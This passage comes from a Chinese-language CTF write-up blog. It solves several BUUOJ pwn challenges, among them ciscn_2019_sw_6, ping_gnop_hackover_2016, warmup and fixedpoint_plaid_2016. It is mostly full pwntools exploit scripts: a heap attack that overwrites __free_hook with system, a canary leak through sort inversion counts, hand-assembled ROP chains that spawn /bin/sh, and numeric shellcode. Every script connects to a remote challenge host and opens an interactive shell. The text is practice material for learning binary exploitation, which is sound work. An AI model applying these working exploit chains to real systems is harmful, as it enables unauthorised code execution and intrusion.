add(0x58,&#39;c&#39; * 0x58,&#39;\x00&#39; * 0x4 + p64(0x61)) #idx 2</span><br><span class="line">	add(0x68,&#39;d&#39; * 0x68,&#39;\x00&#39; * 4 + p64(0x61))   #idx 3</span><br><span class="line">	add(0x68,&#39;e&#39; * 0x68,&#39;\x00&#39; * 4 + p64(0x61))   #idx 4</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(2)</span><br><span class="line">	show(0)</span><br><span class="line">	main_arena &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;,False)[-6:].ljust(8,&#39;\x00&#39;)) - 88</span><br><span class="line">	libc &#x3D; main_arena - 0x10 - lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	__free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	free(1)</span><br><span class="line">	free(3)</span><br><span class="line">	free(4)</span><br><span class="line">	free(3)</span><br><span class="line">	show(2)</span><br><span class="line">	heap_base &#x3D; u64(sh.recvuntil(&quot;\x0a\x70\x68&quot;,True)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">	heap_base &#x3D; (heap_base &gt;&gt; 12) &lt;&lt; 12</span><br><span class="line">	add(0x58,p64(heap_base + 0xD8),&#39;\x00&#39; * 4 + p64(0x61)) #idx 5</span><br><span class="line">	add(0x58,&quot;&#x2F;bin&#x2F;sh\x00&quot;,&#39;\x00&#39; * 4 + p64(0x61)) #idx 6</span><br><span class="line">	add(0x58,p64(heap_base + 0xD8),&#39;\x00&#39; * 4 + p64(0x61)) #idx 7</span><br><span class="line">	for i in range(0,3):</span><br><span class="line">		add(0x68,p64(__free_hook - 0x43),&#39;\x00&#39; * 4 + p64(0x61)) #idx 8-10</span><br><span class="line">	payload  &#x3D; p64(0x21) + p64(heap_base + 0xe8) + p64(0x58) + p64(0) + p64(0x21)</span><br><span class="line">	payload +&#x3D; p64(main_arena + 88) + p64(__free_hook - 0x40 - 0x10)</span><br><span class="line">	add(0x58,payload,&#39;\x00&#39; * 4 + p64(0x61))#idx 11</span><br><span class="line">	payload &#x3D; &#39;\x00&#39; * 3 + p64(0) * 6 + p64(system)</span><br><span class="line">	add(0x68,payload,&#39;\x00&#39; * 4 + p64(0x61)) #idx 12</span><br><span class="line">	free(6)</span><br><span class="line">	log.success(&quot;main_arena: &quot; + hex(main_arena))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;heap_base: &quot; + hex(heap_base))</span><br><span class="line">	log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">	log.success(&quot;fastbin attack: &quot; + hex(__free_hook - 0x40 + 0x7))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20173,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x35-ciscn-2019-sw-6">0x35 ciscn_2019_sw_6</h2>
<h3 id="简单看一下程序的功能，发现是归并排序，然后会输出逆序数">简单看一下程序的功能，发现是归并排序，然后会输出逆序数</h3>
<h3 id="漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak-canary">漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak canary</h3>
<h3 id="考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击">考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击</h3>
<h3 id="1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间">1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间</h3>
<h3 id="2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为-0xFFFFFFFF-0x10000000-299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级">2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为(0xFFFFFFFF - 0x10000000) / 299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级</h3>
<h3 id="3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了">3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了</h3>
<h3 id="4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell">4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell</h3>
<h3 id="但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200-，且50-的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200-次，哈哈哈，没事本地拿到shell就好了，说明思路没有错">但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200+，且50%的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200+次，哈哈哈，没事本地拿到shell就好了，说明思路没有错</h3>
<h3 id="这里介绍一个jly大师傅的解法，scanf-ud-，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅">这里介绍一个jly大师傅的解法，scanf(&quot;%ud&quot;)，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_sw_6&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">canary_list &#x3D; []</span><br><span class="line">def getRop():</span><br><span class="line">	rop &#x3D; []</span><br><span class="line">	rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">	rop.append(0x080ec060) # @ .data</span><br><span class="line">	rop.append(0x080b9856) # pop eax ; ret</span><br><span class="line">	rop.append(0x6E69622F)</span><br><span class="line">	rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret</span><br><span class="line">	rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">	rop.append(0x080ec064) # @ .data + 4</span><br><span class="line">	rop.append(0x080b9856) # pop eax ; ret</span><br><span class="line">	rop.append(0x68732F2F)</span><br><span class="line">	rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret</span><br><span class="line">	rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">	rop.append(0x080ec068) # @ .data + 8</span><br><span class="line">	rop.append(0x0804a773) # xor eax, eax ; ret</span><br><span class="line">	rop.append(0x08055efb) # mov dword ptr [edx], eax ; ret</span><br><span class="line">	rop.append(0x08049021) # pop ebx ; ret</span><br><span class="line">	rop.append(0x080ec060) # @ .data</span><br><span class="line">	rop.append(0x08070521) # pop ecx ; pop ebx ; ret</span><br><span class="line">	rop.append(0x080ec068) # @ .data + 8</span><br><span class="line">	rop.append(0x080ec060) # padding without overwrite ebx</span><br><span class="line">	rop.append(0x080704fa) # pop edx ; ret</span><br><span class="line">	rop.append(0x080ec068) # @ .data + 8</span><br><span class="line">	rop.append(0x0804a773) # xor eax, eax ; ret</span><br><span class="line">	rop.append(0x08096a87) # add eax,2 ; ret</span><br><span class="line">	rop.append(0x08096aa0) # add eax,3 ; ret</span><br><span class="line">	rop.append(0x08096aa0) # add eax,3 ; ret</span><br><span class="line">	rop.append(0x08096aa0) # add eax,3 ; ret</span><br><span class="line">	rop.append(0x0806e173) # int 0x80</span><br><span class="line">	return rop</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_sw_6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	sh.recvuntil(&quot;Name:&quot;)</span><br><span class="line">	sh.sendline(&quot;fuckyou&quot;)</span><br><span class="line">	#leak 1</span><br><span class="line">	sh.recvuntil(&quot;Count?(Input 0 to stop)&quot;)</span><br><span class="line">	sh.sendline(&quot;301&quot;)</span><br><span class="line">	num &#x3D; 0x10000000</span><br><span class="line">	for i in range(0,299):</span><br><span class="line">		sh.recvuntil(&quot;: &quot;)</span><br><span class="line">		sh.sendline(str(num))</span><br><span class="line">		canary_list.append(num)</span><br><span class="line">		num &#x3D; num + 0xCD7C24</span><br><span class="line">	sh.recvuntil(&quot;: &quot;)</span><br><span class="line">	sh.sendline(str(0x0))</span><br><span class="line">	sh.recvuntil(&quot;The result is &quot;)</span><br><span class="line">	magic1 &#x3D; int(sh.recvuntil(&quot;\n&quot;,False),10) - 299</span><br><span class="line">	canary_min_1 &#x3D; (299 - magic1 - 1) * 0xCD7C24 + 0x10000000</span><br><span class="line">	canary_max_1 &#x3D; (299 - magic1) * 0xCD7C24 + 0x10000000</span><br><span class="line">	sh.recvuntil(&quot;Continue?(y&#x2F;n)&quot;)</span><br><span class="line">	sh.sendline(&quot;y&quot;)</span><br><span class="line">	#leak 2</span><br><span class="line">	delta2 &#x3D; (canary_max_1 - canary_min_1) &#x2F; 299</span><br><span class="line">	num &#x3D; canary_min_1</span><br><span class="line">	sh.recvuntil(&quot;Count?(Input 0 to stop)&quot;)</span><br><span class="line">	sh.sendline(&quot;301&quot;)	</span><br><span class="line">	for i in range(0,299):</span><br><span class="line">		sh.recvuntil(&quot;: &quot;)</span><br><span class="line">		sh.sendline(str(num))</span><br><span class="line">		num &#x3D; delta2 + num</span><br><span class="line">	sh.recvuntil(&quot;: &quot;)</span><br><span class="line">	sh.sendline(str(0x0))</span><br><span class="line">	sh.recvuntil(&quot;The result is &quot;)</span><br><span class="line">	magic2 &#x3D; int(sh.recvuntil(&quot;\n&quot;,False),10) - 299</span><br><span class="line">	canary_min_2 &#x3D; (299 - magic2 - 1) * delta2 + canary_min_1</span><br><span class="line">	canary_max_2 &#x3D; (299 - magic2) * delta2 + canary_min_1</span><br><span class="line">	sh.recvuntil(&quot;Continue?(y&#x2F;n)&quot;)</span><br><span class="line">	sh.sendline(&quot;y&quot;)	</span><br><span class="line">	#leak 3	</span><br><span class="line">	delta3 &#x3D; (canary_max_2 - canary_min_2) &#x2F; 299</span><br><span class="line">	num &#x3D; canary_min_2</span><br><span class="line">	sh.recvuntil(&quot;Count?(Input 0 to stop)&quot;)</span><br><span class="line">	sh.sendline(&quot;301&quot;)</span><br><span class="line">	for i in range(0,299):</span><br><span class="line">		sh.recvuntil(&quot;: &quot;)</span><br><span class="line">		sh.sendline(str(num))</span><br><span class="line">		num &#x3D; delta3 + num</span><br><span class="line">	sh.recvuntil(&quot;: &quot;)</span><br><span class="line">	sh.sendline(str(0x0))</span><br><span class="line">	sh.recvuntil(&quot;The result is &quot;)</span><br><span class="line">	magic3 &#x3D; int(sh.recvuntil(&quot;\n&quot;,False),10) - 299</span><br><span class="line">	canary_min_3 &#x3D; (299 - magic3 - 1) * delta3 + canary_min_2</span><br><span class="line">	canary_max_3 &#x3D; (299 - magic3) * delta3 + canary_min_2</span><br><span class="line">	sh.recvuntil(&quot;Continue?(y&#x2F;n)&quot;)</span><br><span class="line">	sh.sendline(&quot;y&quot;)</span><br><span class="line">	canary &#x3D; (canary_max_3 &gt;&gt; 8) &lt;&lt; 8</span><br><span class="line">	sh.recvuntil(&quot;Count?(Input 0 to stop)&quot;)</span><br><span class="line">	sh.sendline(&quot;301&quot;)</span><br><span class="line">	ROP &#x3D; getRop()</span><br><span class="line">	for i in range(0,300):</span><br><span class="line">		sh.recvuntil(&quot;: &quot;)</span><br><span class="line">		sh.sendline(str(0xdeadbeef))</span><br><span class="line">	sh.recvuntil(&quot;: &quot;)</span><br><span class="line">	sh.sendline(str(canary))</span><br><span class="line">	sh.recvuntil(&quot;: &quot;)</span><br><span class="line">	sh.sendline(str(0xdeadbeef))</span><br><span class="line">	for i in ROP:</span><br><span class="line">		sh.recvuntil(&quot;: &quot;)</span><br><span class="line">		sh.sendline(str(i))</span><br><span class="line">	sh.recvuntil(&quot;: &quot;)</span><br><span class="line">	sh.sendline(&quot;0&quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20133,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x36-ping-gnop-hackover-2016">0x36 ping_gnop_hackover_2016</h2>
<h3 id="我将这题称为ROPgadget-ropchain人工版">我将这题称为ROPgadget --ropchain人工版</h3>
<h3 id="题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int-0x80拿到shell">题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过<code>int 0x80</code>拿到shell</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ping_gnop_hackover_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ping_gnop_hackover_2016&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	pop_ebx_ret &#x3D; 0x08050C5E</span><br><span class="line">	pop_ecx_ret &#x3D; 0x080e05f5</span><br><span class="line">	pop_eax_ret &#x3D; 0x080b9b26</span><br><span class="line">	pop_edx_ret &#x3D; 0x0806fe6a</span><br><span class="line">	pop_esi_ret &#x3D; 0x08049a34</span><br><span class="line">	xor_eax_eax_ret &#x3D; 0x08049573</span><br><span class="line">	push_eax_ret &#x3D; 0x080b9ac6</span><br><span class="line">	int_0x80 &#x3D; 0x0806d9c5</span><br><span class="line">	xchg_eax_edx_ret &#x3D; 0x0806cf29</span><br><span class="line">	add_eax_3_ret &#x3D; 0x08096be0</span><br><span class="line">	add_eax_2_ret &#x3D; 0x08096bc7</span><br><span class="line">	add_eax_1_ret &#x3D; 0x0807b576</span><br><span class="line">	add_al_a_ret &#x3D; 0x080e4dc2</span><br><span class="line">	mov_eax_a_ret &#x3D; 0x080e4dc2</span><br><span class="line">	mov_eax_ecx_ret &#x3D; 0x08070408</span><br><span class="line">	pop_ecx_ebx_ret &#x3D; 0x0806fe91</span><br><span class="line">	mov_eax_ecx_pop_3_ret &#x3D; 0x080498B6</span><br><span class="line">	mov_ptr_edx_eax_ret &#x3D; 0x0805596b</span><br><span class="line">	add_al_89 &#x3D; 0x08056e76</span><br><span class="line">	sub_al_83 &#x3D; 0x08077c0f</span><br><span class="line">	dec_eax &#x3D; 0x08064a93</span><br><span class="line">	offset &#x3D; 37</span><br><span class="line">	payload &#x3D; &#39;a&#39; * offset</span><br><span class="line">	payload +&#x3D; p32(0x1337CAFE)</span><br><span class="line">	payload +&#x3D; &#39;aaaabaaacaaadaaaeaaafaaa&#39;</span><br><span class="line">	payload +&#x3D; p32(pop_edx_ret)</span><br><span class="line">	payload +&#x3D; p32(0x080ED584)</span><br><span class="line">	payload +&#x3D; p32(pop_ecx_ret)</span><br><span class="line">	payload +&#x3D; &quot;&#x2F;bin&quot;</span><br><span class="line">	payload +&#x3D; p32(mov_eax_ecx_pop_3_ret)</span><br><span class="line">	payload +&#x3D; p32(0xdeadbeef) * 3</span><br><span class="line">	payload +&#x3D; p32(mov_ptr_edx_eax_ret)</span><br><span class="line">	payload +&#x3D; p32(pop_edx_ret)</span><br><span class="line">	payload +&#x3D; p32(0x080ED588)</span><br><span class="line">	payload +&#x3D; p32(pop_ecx_ret)</span><br><span class="line">	payload +&#x3D; &quot;&#x2F;&#x2F;sh&quot;</span><br><span class="line">	payload +&#x3D; p32(mov_eax_ecx_pop_3_ret)</span><br><span class="line">	payload +&#x3D; p32(0xdeadbeef) * 3</span><br><span class="line">	payload +&#x3D; p32(mov_ptr_edx_eax_ret)</span><br><span class="line">	payload +&#x3D; p32(pop_ecx_ebx_ret)	</span><br><span class="line">	payload +&#x3D; p32(0x080ed594)	</span><br><span class="line">	payload +&#x3D; p32(0x080ed584)	</span><br><span class="line">	payload +&#x3D; p32(xor_eax_eax_ret)</span><br><span class="line">	payload +&#x3D; p32(xchg_eax_edx_ret)</span><br><span class="line">	payload +&#x3D; p32(xor_eax_eax_ret)</span><br><span class="line">	payload +&#x3D; p32(add_al_a_ret)</span><br><span class="line">	payload +&#x3D; p32(add_al_a_ret)</span><br><span class="line">	for i in range(0,9):</span><br><span class="line">		payload +&#x3D; p32(dec_eax)</span><br><span class="line">	payload +&#x3D; p32(int_0x80)</span><br><span class="line">	sh.sendline(payload[::-1])</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20045,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x37-warmup">0x37 warmup</h2>
<h3 id="这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell">这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;warmup&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;warmup&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	write_addr &#x3D; 0x08048135</span><br><span class="line">	read_addr  &#x3D; 0x0804811D</span><br><span class="line">	execve_addr &#x3D; 0x08048122</span><br><span class="line">	offset &#x3D; 32</span><br><span class="line">	payload  &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(read_addr)</span><br><span class="line">	payload +&#x3D; p32(0x080480D8)</span><br><span class="line">	payload +&#x3D; p32(0)</span><br><span class="line">	payload +&#x3D; p32(0x80491bc)</span><br><span class="line">	payload +&#x3D; p32(0x80491bc)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(&quot;&#x2F;bin&#x2F;sh&quot; + &#39;\x00&#39;*4)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	offset &#x3D; 32</span><br><span class="line">	payload  &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(read_addr)</span><br><span class="line">	payload +&#x3D; p32(0x08048122)</span><br><span class="line">	payload +&#x3D; p32(0)</span><br><span class="line">	payload +&#x3D; p32(0x80491bc)</span><br><span class="line">	payload +&#x3D; p32(0x804920c) </span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.send(&quot;&#x2F;bin&#x2F;sh&quot; + &#39;\x00&#39;*4)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20000,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x38-fixedpoint-plaid-2016">0x38 fixedpoint_plaid_2016</h2>
<h3 id="这题就是典型的shellcode，找数字吧小伙子">这题就是典型的shellcode，找数字吧小伙子~~</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;fixedpoint_plaid_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def write(num):</span><br><span class="line">	sh.sendline(str(num))</span><br><span class="line">	sleep(0.1)</span><br><span class="line">	sh.sendline(&quot;395841308&quot;)</span><br><span class="line">	sleep(0.1)</span><br><span class="line">	sh.sendline(&quot;175700696&quot;)</span><br><span class="line">	sleep(0.1)</span><br><span class="line">	sh.sendline(&quot;177668635&quot;)</span><br><span class="line">def send(num):</span><br><span class="line">	sh.sendline(str(num))</span><br><span class="line">	sleep(0.1)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;fixedpoint_plaid_2016&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	send(443750948)</span><br><span class="line">	write(394804464)</span><br><span class="line">	write(395349960)</span><br><span class="line">	write(395424832)</span><br><span class="line">	write(395478312)</span><br><span class="line">	write(394804464)</span><br><span class="line">	write(394804464)</span><br><span class="line">	write(395531792)</span><br><span class="line">	write(395414136)</span><br><span class="line">	write(394301752)</span><br><span class="line">	send(188835259)</span><br><span class="line">	send(275002318)</span><br><span class="line">	send(247465383)</span><br><span class="line">	send(274506417)</span><br><span class="line">	sh.sendline(&quot;a&quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;pwn.buuoj.cn&quot;,20072,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x39-ciscn-2019-final-2">0x39 ciscn_2019_final_2</h2>
<h3 id="典型的UAF和tcache-attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag">典型的UAF和tcache attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag</h3>
